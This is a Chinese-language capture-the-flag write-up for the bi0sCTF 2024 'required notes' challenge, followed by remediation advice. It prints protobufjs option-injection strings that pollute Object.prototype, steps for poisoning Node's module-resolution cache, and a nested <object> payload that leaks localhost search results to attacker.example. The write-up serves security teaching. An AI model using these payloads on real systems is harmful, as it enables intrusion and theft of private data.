# bi0sCTF 2024 - required notes

## 题目简述

服务把每篇笔记保存成 `notes/<16-char-id>.json`，并用 `require.resolve()` 与 `require()` 加载。flag 位于随机 16 字符文件名中；`/search/:prefix` 可以按文件名前缀查找，却只允许本机访问。健康检查机器人关闭 JavaScript 后访问 `/view/Healthcheck`。

解法先借 `/customise` 对 `settings.proto` 的源码拼接触发 protobufjs 原型污染，再把 Node 模块解析器中的 `Healthcheck` 映射到攻击者笔记。即使应用清除 `require.cache` 并删除磁盘文件，相对模块解析缓存仍可保留旧映射。最终让本机机器人渲染一组嵌套 `<object>`，把 localhost 前缀查询变成外部可观察的回退请求，逐字符泄漏 flag 笔记 ID。

## 解题过程

### 从 `.proto` 拼接进入原型链

`/customise` 从 JSON 数组中取出 `title`、`author`，不经语法级验证就写入 `settings.proto` 的字段声明前：

```javascript
protoContents[3] = `  ${title} string title = 1 [default="user"];`;
```

随后 `/create` 调用 `protobuf.parse(schema)`。protobufjs 解析自定义 option 时会按点号路径写对象；把下面一类片段插入字段前缀，便可沿 `constructor.prototype` 写入 `Object.prototype`：

```text
option(a).constructor.prototype.data={};optional
option(a).constructor.prototype.data.name="./notes/Healthcheck";optional
option(a).constructor.prototype.data.exports="./notes/<payload-id>.json";optional
```

官方 exploit 还先写入：

```text
option(a).constructor.prototype.path="./";optional
```

这些属性形成 Node 模块解析器会消费的伪包信息，使逻辑模块名 `./notes/Healthcheck` 或另一个占位名解析到攻击者 JSON。每次修改 schema 后都调用一次 `/create`，确保 protobufjs 真正解析新 option 并触发污染。

### 绕过应用的模块缓存检查

`/view/:noteId` 的防护包括三部分：解析结果必须以 `.json` 结尾；遍历 `module.constructor._pathCache` 检查路径是否以 `<noteId>.json` 结尾；异常时删除可见路径缓存，若目标是 `Healthcheck` 还清空 `require.cache`。

问题是 Node 的模块加载还维护相对请求到模块对象的快速解析记录。应用清理的两个对象没有完整覆盖该状态。官方利用按如下顺序整理缓存：

1. 创建含泄漏 HTML 的攻击者笔记，记其 ID 为 `P`；
2. 污染 `name=./notes/Healthcheck`、`exports=./notes/P.json`，请求 `/view/Healthcheck`，留下 `Healthcheck -> P` 的相对解析记录；
3. 防护虽报错并清空普通 `require.cache`，但旧的相对解析记录仍在；
4. 再污染占位名 `777 -> P` 并访问 `/view/777`，把 `P.json` 重新装入 `require.cache`；
5. 请求 `/view/P?temp`，让服务器删除磁盘上的攻击笔记；
6. 触发 `/healthcheck`。机器人访问 `/view/Healthcheck` 时，旧解析记录命中已经重新缓存的 `P` 模块，攻击者 HTML 仍被渲染。

删除磁盘文件很重要：它避免正常文件解析结果覆盖已经布置好的缓存关系，也表明这里利用的是缓存状态，而不是简单文件读取。

### 用 `<object>` 泄漏本机搜索结果

机器人禁用了 JavaScript，但 `<object>` 的加载与回退不依赖脚本。对每个候选字符生成：

```html
<object data="http://127.0.0.1:3000/search/PREFIX0">
  <object data="https://attacker.example/found/PREFIX0"></object>
</object>
```

并对字符集 `0-9a-z` 并列放置一份。`/search/:noteId` 的行为恰好形成状态 oracle：

- 前缀完全不匹配任何文件时，返回 200 的 `Not found` JSON，外层对象被视为已加载，内层回退不请求；
- 前缀匹配某个文件但尚不是完整文件名时，glob 非空，而对精确 `<prefix>.json` 的访问失败，服务返回 500，浏览器加载内层回退 URL。

因此攻击端收到 `/found/<prefix+char>` 就知道该字符正确。收到回调后，用新前缀重新创建攻击笔记并重复整条缓存布置链。这样可恢复前 15 个字符；完整 16 字符文件名会直接命中并返回 200，不再触发回退，所以最后一位通过枚举 `/view/<15-char-prefix+candidate>`，以是否返回 500 区分。

拿到 16 字符 ID 后访问 `/view/<flag-id>`，页面正文即为 flag。所有关键请求都由健康检查浏览器从 localhost 发出，所以没有直接绕过 `/search` 的来源限制。

## 方法总结

本题的关键链路是 protobuf 语法注入导致原型污染、原型字段影响 Node 模块解析、应用清缓存不完整，以及无脚本 `<object>` 回退侧信道。单独修补 HTML 脚本执行没有意义；应停止拼接 `.proto` 源码，固定允许的 schema 选项，禁止用 `require()` 读取用户数据，并用普通 JSON 解析和显式路径绑定替代模块解析器。
